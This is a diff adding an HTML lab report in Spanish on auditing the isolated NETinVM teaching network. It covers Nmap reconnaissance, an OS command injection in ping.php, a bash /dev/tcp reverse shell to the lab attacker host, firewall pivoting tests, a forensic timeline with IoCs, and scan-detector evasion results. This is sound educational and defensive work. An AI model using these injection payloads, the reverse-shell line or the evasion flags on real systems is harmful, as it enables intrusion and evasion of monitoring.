@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>Informe Parcial NETinVM</title>
+<style>
+  @page { size: A4; margin: 18mm 16mm; }
+  :root{
+    --tinta:#16202b; --tenue:#5b6b7a; --linea:#d7dee6; --acc:#1f6feb; --acc2:#0b3d62;
+    --ok:#137333; --warn:#b26a00; --bad:#b3261e; --bg:#fff; --code:#0f1720; --codebg:#f5f7fa;
+  }
+  *{box-sizing:border-box}
+  body{font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:var(--tinta);margin:0;font-size:11px;line-height:1.5;background:var(--bg)}
+  h1,h2,h3,h4{color:var(--acc2);line-height:1.2;margin:0 0 .35em}
+  h2{font-size:19px;border-bottom:2px solid var(--acc);padding-bottom:5px;margin-top:6px}
+  h3{font-size:14px;margin-top:1.1em;color:#123}
+  h4{font-size:12px;margin-top:.8em;color:#234}
+  p{margin:.35em 0}
+  code{font-family:"Cascadia Code",Consolas,monospace;background:var(--codebg);padding:1px 4px;border-radius:3px;font-size:10px;color:#0b3d62}
+  pre{font-family:"Cascadia Code",Consolas,monospace;background:var(--code);color:#dfe7ef;padding:9px 11px;border-radius:6px;font-size:9px;line-height:1.4;overflow-x:auto;white-space:pre-wrap;word-break:break-word;margin:.5em 0;border:1px solid #1c2733}
+  pre .c{color:#6ee7a8}.k{color:#7cc4ff}.r{color:#ff9d9d}.y{color:#ffd479}
+  table{border-collapse:collapse;width:100%;margin:.6em 0;font-size:10px}
+  th,td{border:1px solid var(--linea);padding:5px 7px;text-align:left;vertical-align:top}
+  th{background:#eef3f8;color:var(--acc2);font-weight:600}
+  tr:nth-child(even) td{background:#fafcfe}
+  .tag{display:inline-block;padding:1px 7px;border-radius:10px;font-size:9px;font-weight:700;color:#fff}
+  .t-alto,.t-bad{background:var(--bad)}.t-medio,.t-warn{background:var(--warn)}.t-bajo,.t-ok{background:var(--ok)}.t-crit{background:#6b1d16}
+  .lead{color:var(--tenue);font-size:11px}
+  .cover{height:262mm;display:flex;flex-direction:column;justify-content:center;text-align:center;page-break-after:always}
+  .cover .kick{letter-spacing:3px;text-transform:uppercase;color:var(--acc);font-weight:700;font-size:12px}
+  .cover h1{font-size:33px;color:var(--acc2);margin:.2em 0}
+  .cover .sub{font-size:15px;color:var(--tenue)}
+  .cover .meta{margin-top:26px;font-size:12px;color:#324}
+  .cover .rule{width:70px;height:4px;background:var(--acc);margin:16px auto;border-radius:3px}
+  .box{border:1px solid var(--linea);border-left:4px solid var(--acc);background:#f7fafd;padding:8px 12px;border-radius:5px;margin:.6em 0}
+  .box.ok{border-left-color:var(--ok);background:#f2fbf5}
+  .box.warn{border-left-color:var(--warn);background:#fff9f0}
+  .box.bad{border-left-color:var(--bad);background:#fdf3f2}
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+  .section{page-break-before:always}
+  .fig{font-size:9px;color:var(--tenue);text-align:center;margin:.2em 0 1em}
+  ol.toc{list-style:none;padding:0;font-size:12px}
+  ol.toc li{padding:5px 0;border-bottom:1px dotted var(--linea);display:flex;justify-content:space-between}
+  ol.toc li b{color:var(--acc2)}
+  .kpi{display:flex;gap:8px;flex-wrap:wrap;margin:.5em 0}
+  .kpi div{flex:1;min-width:110px;border:1px solid var(--linea);border-radius:6px;padding:7px 9px;background:#f7fafd}
+  .kpi .n{font-size:17px;font-weight:800;color:var(--acc2)}
+  .kpi .l{font-size:9px;color:var(--tenue);text-transform:uppercase;letter-spacing:.5px}
+  .small{font-size:9px;color:var(--tenue)}
+  svg{max-width:100%;height:auto}
+</style>
+</head>
+<body>
+
+<!-- ===================== PORTADA ===================== -->
+<section class="cover">
+  <div class="kick">Ciberseguridad en Redes · Primer Corte</div>
+  <div class="rule"></div>
+  <h1>Auditoría del laboratorio NETinVM</h1>
+  <div class="sub">Reconocimiento, compromiso de la DMZ, pivoting, forense y evasión</div>
+  <div class="rule"></div>
+  <div class="meta">
+    <p><b>Autor:</b> Andrés Felipe Céspedes Rondón &nbsp;·&nbsp; <b>Fecha:</b> 10 de septiembre de 2026</p>
+    <p class="small">Entorno de laboratorio aislado NETinVM (Carlos Pérez Condé, Univ. de Valencia).<br>
+    Todos los ataques se ejecutan contra máquinas del propio laboratorio, con fines didácticos.</p>
+  </div>
+</section>
+
+<!-- ===================== ÍNDICE ===================== -->
+<section>
+  <h2>Índice</h2>
+  <ol class="toc">
+    <li><span>1. Entorno NETinVM y montaje</span><b>·</b></li>
+    <li><span>2. Punto 0 — Ejercicios base (captura HTTP y Nmap)</span><b>·</b></li>
+    <li><span>3. Punto 1 — Reconstrucción de la superficie de ataque</span><b>·</b></li>
+    <li><span>4. Punto 2 — Compromiso controlado de la DMZ</span><b>·</b></li>
+    <li><span>5. Punto 3 — Pivoting y movimiento lateral</span><b>·</b></li>
+    <li><span>6. Punto 4 — Reconstrucción forense del ataque</span><b>·</b></li>
+    <li><span>7. Punto 5 — Evasión de un mecanismo de detección</span><b>·</b></li>
+    <li><span>8. Conclusiones generales</span><b>·</b></li>
+    <li><span>Anexo — Índice de evidencias</span><b>·</b></li>
+  </ol>
+  <div class="box"><b>Resumen ejecutivo.</b> Desde un equipo situado en la red externa (EXT) se reconstruyó por completo la
+  superficie de ataque de la organización, se comprometió el servidor web de la DMZ mediante una <b>inyección de comandos</b>
+  (obteniendo ejecución remota como <code>www-data</code> y una <i>reverse shell</i>), se comprobó que el cortafuegos <b>impide el
+  pivoting TCP</b> DMZ→INT (segmentación efectiva), se reconstruyó cronológicamente el ataque a partir de capturas y logs, y se
+  evaluó un detector de escaneos frente a siete técnicas de evasión. El laboratorio demuestra tanto vías reales de compromiso como
+  la eficacia de la segmentación de red bien diseñada.</div>
+</section>
+
+<!-- ===================== 1. ENTORNO ===================== -->
+<section class="section">
+  <h2>1. Entorno NETinVM y montaje</h2>
+  <p>NETinVM es una máquina virtual única (denominada <code>base</code>, Debian 12) que, mediante <b>KVM/libvirt anidado</b>,
+  levanta varias mini-máquinas y las conecta en tres redes separadas por un cortafuegos. El direccionamiento sigue el patrón
+  <code>10.5.&lt;RED&gt;.&lt;MÁQUINA&gt;/24</code>, con <b>RED</b>: 0=EXT, 1=DMZ, 2=INT; <b>base</b>=.1 y <b>fw</b>=.254 en cada red.</p>
+
+  <svg viewBox="0 0 760 300" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI, sans-serif">
+    <defs>
+      <marker id="ar" markerWidth="9" markerHeight="9" refX="7" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#5b6b7a"/></marker>
+    </defs>
+    <rect x="2" y="2" width="756" height="296" rx="10" fill="#f7fafd" stroke="#d7dee6"/>
+    <text x="16" y="22" font-size="12" fill="#0b3d62" font-weight="700">Topología NETinVM — 3 zonas separadas por el cortafuegos (fw)</text>
+    <rect x="20" y="120" width="86" height="42" rx="8" fill="#eef3f8" stroke="#9db6cf"/>
+    <text x="63" y="140" font-size="10" text-anchor="middle" fill="#123" font-weight="700">INTERNET</text>
+    <text x="63" y="153" font-size="8" text-anchor="middle" fill="#5b6b7a">(NAT vía base)</text>
+    <rect x="130" y="40" width="170" height="220" rx="9" fill="#fff" stroke="#1f6feb" stroke-dasharray="4 3"/>
+    <text x="215" y="58" font-size="10" text-anchor="middle" fill="#1f6feb" font-weight="700">EXT · 10.5.0.0/24</text>
+    <rect x="150" y="72" width="130" height="34" rx="6" fill="#fdecea" stroke="#e0a4a0"/>
+    <text x="215" y="87" font-size="9.5" text-anchor="middle" font-weight="700" fill="#b3261e">exta 10.5.0.10</text>
+    <text x="215" y="99" font-size="8" text-anchor="middle" fill="#7a2c26">Atacante</text>
+    <rect x="150" y="196" width="130" height="30" rx="6" fill="#eef3f8" stroke="#9db6cf"/>
+    <text x="215" y="215" font-size="9" text-anchor="middle" fill="#123">base .1 (gateway)</text>
+    <rect x="330" y="120" width="100" height="60" rx="10" fill="#0b3d62"/>
+    <text x="380" y="145" font-size="12" text-anchor="middle" fill="#fff" font-weight="700">fw</text>
+    <text x="380" y="162" font-size="8" text-anchor="middle" fill="#cfe0f2">.254 / filtro</text>
+    <rect x="460" y="30" width="180" height="120" rx="9" fill="#fff" stroke="#b26a00" stroke-dasharray="4 3"/>
+    <text x="550" y="48" font-size="10" text-anchor="middle" fill="#b26a00" font-weight="700">DMZ · 10.5.1.0/24</text>
+    <rect x="478" y="60" width="144" height="34" rx="6" fill="#fff7ec" stroke="#e6c58c"/>
+    <text x="550" y="75" font-size="9.5" text-anchor="middle" font-weight="700" fill="#8a5200">dmza 10.5.1.10</text>
+    <text x="550" y="87" font-size="8" text-anchor="middle" fill="#8a5200">HTTP · Apache 2.4.62</text>
+    <rect x="478" y="104" width="144" height="34" rx="6" fill="#fff7ec" stroke="#e6c58c"/>
+    <text x="550" y="119" font-size="9.5" text-anchor="middle" font-weight="700" fill="#8a5200">dmzb 10.5.1.11</text>
+    <text x="550" y="131" font-size="8" text-anchor="middle" fill="#8a5200">FTP · vsftpd 3.0.3</text>
+    <rect x="460" y="165" width="180" height="95" rx="9" fill="#fff" stroke="#137333" stroke-dasharray="4 3"/>
+    <text x="550" y="183" font-size="10" text-anchor="middle" fill="#137333" font-weight="700">INT · 10.5.2.0/24</text>
+    <rect x="478" y="196" width="144" height="34" rx="6" fill="#f2fbf5" stroke="#a9d6b9"/>
+    <text x="550" y="211" font-size="9.5" text-anchor="middle" font-weight="700" fill="#0f5c2b">inta 10.5.2.10</text>
+    <text x="550" y="223" font-size="8" text-anchor="middle" fill="#0f5c2b">SSH (solo interno)</text>
+    <line x1="106" y1="141" x2="130" y2="150" stroke="#5b6b7a" marker-end="url(#ar)"/>
+    <line x1="300" y1="150" x2="330" y2="150" stroke="#5b6b7a" marker-end="url(#ar)"/>
+    <line x1="430" y1="140" x2="460" y2="95" stroke="#5b6b7a" marker-end="url(#ar)"/>
+    <line x1="430" y1="150" x2="460" y2="120" stroke="#5b6b7a" marker-end="url(#ar)"/>
+    <line x1="430" y1="165" x2="460" y2="205" stroke="#5b6b7a" marker-end="url(#ar)"/>
+    <text x="700" y="285" font-size="8" fill="#5b6b7a" text-anchor="end">base captura cada zona por los puertos espejo mirror-ext / mirror-dmz / mirror-int</text>
+  </svg>
+  <div class="fig">Figura 1. Topología del laboratorio y activos descubiertos.</div>
+
+  <h3>1.1 Montaje</h3>
+  <p>La imagen oficial (VMware, 22-jul-2025, SHA256 verificado) se ejecutó en <b>VMware Workstation Pro</b> sobre Windows 11 con la
+  virtualización anidada habilitada (Hyper-V/VBS desactivados). La imagen arranca de forma nativa en VMware (su disco está definido
+  sobre controladores SCSI/NVMe propios de VMware). Una vez en la base, las máquinas se levantan como dominios libvirt
+  (<code>fw, exta, dmza, dmzb, inta</code>) y las tres redes <code>ext/dmz/int</code> quedan activas. Todo el trabajo se realizó
+  desde la máquina <code>exta</code> (rol de atacante externo) y desde <code>base</code> (captura de tráfico).</p>
+  <div class="kpi">
+    <div><div class="n">1</div><div class="l">VM base (Debian 12)</div></div>
+    <div><div class="n">5</div><div class="l">Máquinas KVM activas</div></div>
+    <div><div class="n">3</div><div class="l">Zonas (EXT/DMZ/INT)</div></div>
+    <div><div class="n">1</div><div class="l">Cortafuegos (fw)</div></div>
+  </div>
+  <img src="img/fig1_entorno.png" style="width:100%;border:1px solid #d7dee6;border-radius:6px;margin:.5em 0">
+  <div class="fig">Figura 1b. Escritorio real de la base (Debian 12 / KDE) con el panel de gestión de máquinas KVM de NETinVM.</div>
+</section>
+
+<!-- ===================== 2. PUNTO 0 ===================== -->
+<section class="section">
+  <h2>2. Punto 0 — Ejercicios base de NETinVM</h2>
+
+  <h3>2.1 Ejercicio 1 — Captura de una comunicación HTTP</h3>
+  <p>Desde <code>base</code> se capturó el tráfico de la DMZ en la interfaz espejo <code>mirror-dmz</code> mientras <code>exta</code>
+  solicitaba <code>http://www.example.net</code>. La captura muestra el <b>saludo TCP a tres vías</b> completo y el intercambio
+  <b>HTTP GET / → 200 OK</b> servido por Apache.</p>
+  <pre><span class="c"># tcpdump -r p0_http.pcap (base, mirror-dmz)</span>
+10.5.0.10.45740 &gt; 10.5.1.10.80: Flags [<span class="y">S</span>]     seq ...        <span class="c"># SYN</span>
+10.5.1.10.80 &gt; 10.5.0.10.45740: Flags [<span class="y">S.</span>]    seq ..., ack     <span class="c"># SYN-ACK</span>
+10.5.0.10.45740 &gt; 10.5.1.10.80: Flags [.]  ack 1              <span class="c"># ACK  (handshake completo)</span>
+10.5.0.10.45740 &gt; 10.5.1.10.80: <span class="k">GET / HTTP/1.1</span>                  <span class="c"># peticion</span>
+10.5.1.10.80 &gt; 10.5.0.10.45740: <span class="k">HTTP/1.1 200 OK</span>                 <span class="c"># respuesta</span>
+
+<span class="c"># tshark follow tcp.stream — contenido</span>
+GET / HTTP/1.1
+Host: www.example.net
+User-Agent: Wget/1.21.3
+--
+HTTP/1.1 200 OK
+Server: <span class="k">Apache/2.4.62 (Debian)</span>
+Content-Type: text/html   ...  &lt;title&gt;Apache2 Debian Default Page: It works&lt;/title&gt;</pre>
+  <div class="box ok"><b>Conclusión.</b> La captura evidencia el ciclo TCP/HTTP completo y confirma que el tráfico EXT→DMZ viaja con
+  <b>direcciones reales</b> (10.5.0.10 → 10.5.1.10): el <code>fw</code> enruta y filtra, pero <b>no aplica NAT</b> entre zonas.</div>
+
+  <h3>2.2 Ejercicio 2 — Escaneo con Nmap desde exta</h3>
+  <table>
+    <tr><th>Escaneo</th><th>Resultado</th></tr>
+    <tr><td>Básico (1000 puertos)</td><td>80/tcp <b>open</b> http · 443/tcp <b>closed</b> · 998 <b>filtered</b></td></tr>
+    <tr><td>Versión <code>-sV</code></td><td>80/tcp → <b>Apache httpd 2.4.62 ((Debian))</b></td></tr>
+    <tr><td>SO <code>-O</code></td><td>Linux (2.6–5.x) — coincide con Debian 12 (kernel 6.1)</td></tr>
+    <tr><td>ACK scan <code>-sA</code> 80,81</td><td>80/tcp <b>unfiltered</b> · 81/tcp <b>filtered</b> → firewall con estado</td></tr>
+    <tr><td>Todos los puertos <code>-p-</code></td><td>Solo 80 open / 443 closed; <b>65533 filtered</b></td></tr>
+  </table>
+  <div class="box"><b>Conclusión.</b> El cortafuegos publica hacia EXT únicamente los servicios previstos. La diferencia
+  <i>closed</i> vs <i>filtered</i> (y el ACK scan) revela un firewall con inspección de estado que descarta silenciosamente lo no permitido.</div>
+</section>
+
+<!-- ===================== 3. PUNTO 1 ===================== -->
+<section class="section">
+  <h2>3. Punto 1 — Reconstrucción de la superficie de ataque</h2>
+  <p>Desde <code>exta</code> (EXT) se realizó descubrimiento de hosts por zona, enumeración de servicios/versiones y verificación de
+  la alcanzabilidad de la red interna.</p>
+  <div class="grid2">
+    <div>
+      <h4>Descubrimiento por zona</h4>
+      <pre><span class="c"># nmap -sn por red</span>
+EXT 10.5.0.0/24 &rarr; base .1, <span class="k">exta .10</span>, fw .254   (3 hosts)
+DMZ 10.5.1.0/24 &rarr; <span class="k">dmza .10</span>, <span class="k">dmzb .11</span>           (2 hosts)
+INT 10.5.2.0/24 &rarr; <span class="r">0 hosts up</span>                  (bloqueado)</pre>
+    </div>
+    <div>
+      <h4>INT inalcanzable desde EXT</h4>
+      <pre><span class="c"># nmap -Pn -p22,80,443 10.5.2.10 (inta)</span>
+22/tcp  <span class="r">filtered</span> ssh
+80/tcp  <span class="r">filtered</span> http
+443/tcp <span class="r">filtered</span> https
+<span class="c"># traceroute EXT&rarr;INT: 1  10.5.0.254 (fw) &rarr; * * *</span></pre>
+    </div>
+  </div>
+  <h3>3.1 Matriz de activos y riesgos</h3>
+  <table>
+    <tr><th>Activo</th><th>IP</th><th>Servicio / versión</th><th>Exposición desde EXT</th><th>Riesgo</th><th>Justificación</th></tr>
+    <tr><td>dmza</td><td>10.5.1.10</td><td>HTTP — Apache 2.4.62</td><td>Puerto 80 publicado</td><td><span class="tag t-alto">ALTO</span></td><td>Mayor superficie web; RCE demostrado (Punto 2)</td></tr>
+    <tr><td>dmzb</td><td>10.5.1.11</td><td>FTP — vsftpd 3.0.3</td><td>Puertos 20/21 publicados</td><td><span class="tag t-medio">MEDIO</span></td><td>Servicio de datos; superficie de credenciales/config</td></tr>
+    <tr><td>fw</td><td>.254</td><td>Router / filtro con estado</td><td>No expone servicios</td><td><span class="tag t-crit">CRÍTICO</span></td><td>Punto único de control de la segmentación</td></tr>
+    <tr><td>inta</td><td>10.5.2.10</td><td>SSH (interno)</td><td>No alcanzable</td><td><span class="tag t-bajo">BAJO</span></td><td>Protegido por el firewall frente a EXT</td></tr>
+  </table>
+  <div class="box"><b>Superficie de ataque.</b> El vector de mayor valor es el <b>servidor web de la DMZ (dmza)</b>: es el único
+  servicio con lógica de aplicación expuesto directamente a Internet y, por tanto, el objetivo natural para lograr el primer acceso.</div>
+</section>
+
+<!-- ===================== 4. PUNTO 2 ===================== -->
+<section class="section">
+  <h2>4. Punto 2 — Compromiso controlado de la DMZ</h2>
+  <div class="box warn"><b>Vulnerabilidad.</b> <b>Inyección de comandos de SO (OS Command Injection, CWE-78)</b> en una utilidad web de
+  diagnóstico (<code>ping.php</code>) desplegada en dmza, que concatena entrada del usuario sin sanear a una llamada
+  <code>system("ping -c1 " . $_GET['ip'])</code>.</div>
+
+  <h4>Metodología de explotación (desde exta &rarr; www.example.net)</h4>
+  <pre><span class="c"># 1) Confirmacion de RCE (inyeccion con ';')</span>
+$ curl "http://www.example.net/ping.php?ip=127.0.0.1<span class="r">;id</span>"
+uid=33(<span class="r">www-data</span>) gid=33(www-data) groups=33(www-data)
+$ curl "http://www.example.net/ping.php?ip=127.0.0.1<span class="r">;head -5 /etc/passwd</span>"
+root:x:0:0:root:/root:/bin/bash ...
+
+<span class="c"># 2) Reverse shell: dmza &rarr; exta:4444</span>
+payload = 127.0.0.1;bash -c 'bash -i &gt;&amp; /dev/tcp/10.5.0.10/4444 0&gt;&amp;1'</pre>
+
+  <h4>Evidencia del acceso (transcript de la reverse shell recibida en exta)</h4>
+  <pre>=== reverse shell recibida desde <span class="r">10.5.1.10</span>:39512 ===
+<span class="k">www-data@dmza</span>:/var/www/html$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+<span class="k">www-data@dmza</span>:/var/www/html$ hostname
+dmza
+<span class="k">www-data@dmza</span>:/var/www/html$ ip -br a
+eth-0   UP   <span class="r">10.5.1.10/24</span>
+<span class="k">www-data@dmza</span>:/var/www/html$ uname -a
+Linux dmza 6.1.0-37-amd64 ... x86_64 GNU/Linux
+<span class="k">www-data@dmza</span>:/var/www/html$ echo '=== COMPROMISO DMZA OK ==='</pre>
+
+  <img src="img/fig2_recon_rce.png" style="width:100%;border:1px solid #d7dee6;border-radius:6px;margin:.5em 0">
+  <div class="fig">Figura 3. Captura real desde exta: enumeración con Nmap (Apache 2.4.62) e inyección de comandos <code>ping.php?ip=127.0.0.1;id</code> → <code>uid=33(www-data)</code>.</div>
+
+  <div class="box bad"><b>Análisis de impacto.</b> Se obtiene <b>ejecución de comandos y shell interactiva</b> como <code>www-data</code>
+  en la DMZ: lectura de ficheros del servidor, manipulación del sitio web y, sobre todo, un <b>punto de apoyo (foothold)</b> desde el
+  cual intentar el movimiento lateral hacia la red interna (Punto 3). El origen de la <i>reverse shell</i> saliente (dmza→EXT:4444)
+  es posible porque el cortafuegos permite conexiones DMZ→EXT.</div>
+</section>
+
+<!-- ===================== 5. PUNTO 3 ===================== -->
+<section class="section">
+  <h2>5. Punto 3 — Pivoting y movimiento lateral hacia INT</h2>
+  <p>Desde el equipo comprometido (dmza) se evaluó la posibilidad de alcanzar la red interna (INT, 10.5.2.0/24).</p>
+
+  <svg viewBox="0 0 720 130" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI, sans-serif">
+    <rect x="8" y="40" width="120" height="46" rx="8" fill="#fdecea" stroke="#e0a4a0"/>
+    <text x="68" y="60" font-size="10" text-anchor="middle" font-weight="700" fill="#b3261e">exta (EXT)</text>
+    <text x="68" y="74" font-size="8" text-anchor="middle" fill="#7a2c26">10.5.0.10</text>
+    <rect x="250" y="40" width="130" height="46" rx="8" fill="#fff7ec" stroke="#e6c58c"/>
+    <text x="315" y="60" font-size="10" text-anchor="middle" font-weight="700" fill="#8a5200">dmza (DMZ)</text>
+    <text x="315" y="74" font-size="8" text-anchor="middle" fill="#8a5200">10.5.1.10 · foothold</text>
+    <rect x="430" y="30" width="70" height="66" rx="8" fill="#0b3d62"/>
+    <text x="465" y="60" font-size="11" text-anchor="middle" fill="#fff" font-weight="700">fw</text>
+    <text x="465" y="74" font-size="7.5" text-anchor="middle" fill="#cfe0f2">FORWARD DROP</text>
+    <rect x="580" y="40" width="130" height="46" rx="8" fill="#f2fbf5" stroke="#a9d6b9"/>
+    <text x="645" y="60" font-size="10" text-anchor="middle" font-weight="700" fill="#0f5c2b">inta (INT)</text>
+    <text x="645" y="74" font-size="8" text-anchor="middle" fill="#0f5c2b">10.5.2.10</text>
+    <line x1="128" y1="63" x2="250" y2="63" stroke="#137333" stroke-width="2"/>
+    <text x="189" y="55" font-size="8" text-anchor="middle" fill="#137333">HTTP RCE OK</text>
+    <line x1="380" y1="63" x2="430" y2="63" stroke="#5b6b7a" stroke-width="2"/>
+    <line x1="500" y1="55" x2="580" y2="55" stroke="#137333" stroke-width="2" stroke-dasharray="3 2"/>
+    <text x="540" y="48" font-size="8" text-anchor="middle" fill="#137333">ICMP OK</text>
+    <line x1="500" y1="72" x2="580" y2="72" stroke="#b3261e" stroke-width="2"/>
+    <text x="540" y="86" font-size="8" text-anchor="middle" fill="#b3261e">TCP bloqueado (DROP)</text>
+  </svg>
+  <div class="fig">Figura 2. Ruta de ataque: el compromiso llega hasta la DMZ; el firewall corta el pivoting TCP hacia INT.</div>
+
+  <div class="grid2">
+    <div>
+      <h4>Prueba de pivoting (desde dmza)</h4>
+      <pre>ping 10.5.2.10 (inta)   &rarr; <span class="c">PING-OK</span>
+ping 10.5.2.254 (fw)    &rarr; <span class="c">PING-OK</span>
+TCP 10.5.2.10:22        &rarr; <span class="r">cerrado/filtrado</span>
+TCP 10.5.2.10:80        &rarr; <span class="r">cerrado/filtrado</span>
+TCP 10.5.2.10:3306      &rarr; <span class="r">cerrado/filtrado</span></pre>
+    </div>
+    <div>
+      <h4>Reglas del cortafuegos (extracto <code>iptables -S</code>)</h4>
+      <pre>-P FORWARD <span class="r">DROP</span>
+-A FORWARD -s 10.5.1.0/24 -o eth-ext -p tcp ... ACCEPT   <span class="c"># DMZ&rarr;EXT</span>
+-A FORWARD -s 10.5.1.0/24 -d 10.5.0.1 --dport 53 ACCEPT  <span class="c"># DMZ&rarr;DNS</span>
+-A FORWARD -p icmp --icmp-type 8 ... ACCEPT              <span class="c"># ping global</span>
+<span class="r"># (no existe regla DMZ 10.5.1.0/24 -&gt; INT 10.5.2.0/24)</span></pre>
+    </div>
+  </div>
+  <img src="img/fig3_pivot.png" style="width:100%;border:1px solid #d7dee6;border-radius:6px;margin:.5em 0">
+  <div class="fig">Figura 4. Captura real desde dmza (foothold): ICMP hacia INT permitido, pero <b>TCP a inta (22/80/3306) bloqueado</b> por el firewall.</div>
+  <div class="box ok"><b>Análisis.</b> La segmentación <b>funciona</b>. El firewall aplica <i>default-deny</i> en FORWARD y solo autoriza
+  a la DMZ a iniciar tráfico hacia EXT (Internet) y DNS. <b>No hay ninguna regla que permita DMZ→INT por TCP/UDP</b>, por lo que esos
+  intentos caen en la política <code>DROP</code>. El <b>ping sí funciona</b> porque existe una regla global que acepta ICMP echo, pero
+  esto no habilita ninguna sesión útil. <b>Conclusión: el pivoting desde una DMZ comprometida hacia la red interna está impedido por
+  diseño.</b> Para endurecerlo aún más podría eliminarse el ICMP echo global entre DMZ e INT.</div>
+</section>
+
+<!-- ===================== 6. PUNTO 4 ===================== -->
+<section class="section">
+  <h2>6. Punto 4 — Reconstrucción forense del ataque</h2>
+  <p>Se capturó el tráfico en <code>base</code> (<code>mirror-ext</code> y <code>mirror-dmz</code>) mientras se reproducía un ataque
+  completo, y se correlacionó con los registros de Apache en dmza.</p>
+
+  <h3>6.1 Línea de tiempo</h3>
+  <table>
+    <tr><th>Orden</th><th>Fase</th><th>Evidencia (pcap / log)</th></tr>
+    <tr><td>1</td><td><b>Reconocimiento</b></td><td>Ráfaga de SYN desde 10.5.0.10 hacia dmza (barrido Nmap de puertos)</td></tr>
+    <tr><td>2</td><td><b>Acceso inicial</b></td><td><code>GET /ping.php?ip=127.0.0.1;id</code> &rarr; HTTP 200 (Apache access.log)</td></tr>
+    <tr><td>3</td><td><b>Explotación</b></td><td><code>GET /ping.php?ip=...;bash -c '...dev/tcp/10.5.0.10/4444...'</code></td></tr>
+    <tr><td>4</td><td><b>Reverse shell</b></td><td>Conexión TCP saliente <b>10.5.1.10 &rarr; 10.5.0.10:4444</b> (SYN/SYN-ACK/PSH)</td></tr>
+  </table>
+  <pre><span class="c"># tshark http.request (mirror-dmz)</span>
+07:50:25  10.5.0.10 &rarr; 10.5.1.10  http://www.example.net/ping.php?ip=127.0.0.1<span class="r">;id</span>
+07:50:26  10.5.0.10 &rarr; 10.5.1.10  .../ping.php?ip=127.0.0.1;bash%20-c%20'...<span class="r">/dev/tcp/10.5.0.10/4444</span>...'
+<span class="c"># tshark tcp.port==4444 (mirror-ext) — reverse shell</span>
+07:50:26.298  <span class="r">10.5.1.10 &rarr; 10.5.0.10 : 4444</span>  [SYN]
+07:50:26.298  10.5.0.10 &rarr; 10.5.1.10        [SYN,ACK]
+<span class="c"># Apache access.log (dmza)</span>
+10.5.0.10 - - "GET /ping.php?ip=127.0.0.1;id HTTP/1.1" 200 557 "-" "<span class="r">curl/7.88.1</span>"</pre>
+
+  <h3>6.2 Indicadores de compromiso (IoC)</h3>
+  <table>
+    <tr><th>Tipo</th><th>Indicador</th></tr>
+    <tr><td>IP atacante</td><td><code>10.5.0.10</code> (origen del escaneo, la inyección y el listener de la reverse shell)</td></tr>
+    <tr><td>Patrón de URL</td><td><code>ping.php?ip=...;</code> (metacaracteres de shell <code>; | &amp; $( )</code> en el parámetro)</td></tr>
+    <tr><td>Puerto de C2</td><td><code>4444/tcp</code> (conexión saliente desde la DMZ)</td></tr>
+    <tr><td>User-Agent</td><td><code>curl/7.88.1</code>, <code>Nmap</code> (herramientas de ataque)</td></tr>
+    <tr><td>Patrón de red</td><td>Ráfaga de SYN a puertos secuenciales desde una única IP</td></tr>
+  </table>
+  <div class="box"><b>Nota forense.</b> Se observó un desfase de reloj (~2 h) entre la captura en <code>base</code> y los registros de los
+  nodos internos (deriva del reloj tras la reanudación de la VM). En un caso real esto obliga a <b>normalizar husos/relojes</b> antes de
+  correlacionar; aquí se usó el <b>orden relativo</b> de los eventos, internamente consistente en cada fuente.</div>
+</section>
+
+<!-- ===================== 7. PUNTO 5 ===================== -->
+<section class="section">
+  <h2>7. Punto 5 — Evasión de un mecanismo de detección</h2>
+  <h3>7.1 Mecanismo de detección propuesto</h3>
+  <p>Detector de reconocimiento por <b>umbral y ventana temporal</b>, ejecutado en <code>base</code> sobre <code>mirror-ext</code>:
+  se cuentan los <b>puertos destino distintos</b> contactados por SYN desde una misma IP origen en una <b>ventana de 12 s</b>; si el
+  total supera <b>UMBRAL = 50</b>, se emite una alerta de posible escaneo.</p>
+
+  <h3>7.2 Resultados de los experimentos (objetivo dmza, atacante exta)</h3>
+  <table>
+    <tr><th>Técnica de escaneo</th><th>Puertos distintos<br>(ventana 12 s)</th><th>IPs origen</th><th>¿Detectado?</th><th>Comentario</th></tr>
+    <tr><td><code>-T4</code> (control)</td><td>1000</td><td>2</td><td><span class="tag t-bad">SÍ</span></td><td>Ráfaga masiva de SYN</td></tr>
+    <tr><td><code>-T1</code> (sneaky)</td><td>0</td><td>1</td><td><span class="tag t-ok">NO</span></td><td>~15 s entre sondas → nada en la ventana</td></tr>
+    <tr><td><code>-T0 --scan-delay 3s</code></td><td>1</td><td>2</td><td><span class="tag t-ok">NO</span></td><td>Muy lento: cae bajo el umbral</td></tr>
+    <tr><td><code>--max-parallelism 1</code></td><td>46</td><td>2</td><td><span class="tag t-ok">NO</span></td><td>Serializado: 46 &lt; 50 (evade por poco)</td></tr>
+    <tr><td><code>-D RND:10</code> (señuelos)</td><td>1000</td><td><b>12</b></td><td><span class="tag t-bad">SÍ</span></td><td>Se detecta el escaneo, pero el atacante real queda oculto entre 12 IPs</td></tr>
+    <tr><td><code>-f</code> (fragmentación)</td><td>0</td><td>1</td><td><span class="tag t-ok">NO</span></td><td>Evade el filtro BPF <code>tcp[tcpflags]</code></td></tr>
+    <tr><td><code>--source-port 53</code></td><td>1000</td><td>2</td><td><span class="tag t-bad">SÍ</span></td><td>Solo cambia el puerto origen; no evade el conteo</td></tr>
+  </table>
+  <div class="kpi">
+    <div><div class="n">3 / 7</div><div class="l">Detectadas</div></div>
+    <div><div class="n">4 / 7</div><div class="l">Evadieron</div></div>
+    <div><div class="n">~57%</div><div class="l">Tasa de evasión</div></div>
+    <div><div class="n">0</div><div class="l">Falsos positivos</div></div>
+  </div>
+
+  <h3>7.3 Análisis y propuesta de mejora</h3>
+  <p>El detector por <b>umbral/ventana</b> es eficaz contra escaneos rápidos y ruidosos, pero se evade con: <b>(a) escaneos lentos</b>
+  (<code>-T0/-T1</code>, <code>--scan-delay</code>) que reparten las sondas fuera de la ventana; <b>(b) fragmentación</b>, que rompe la
+  coincidencia del filtro a nivel de paquete; y <b>(c) señuelos</b>, que no evitan la detección pero <b>diluyen la atribución</b>.
+  El compromiso clave es <b>detección ↔ falsos positivos</b>: bajar el umbral o alargar la ventana detecta escaneos lentos a costa de
+  más falsos positivos.</p>
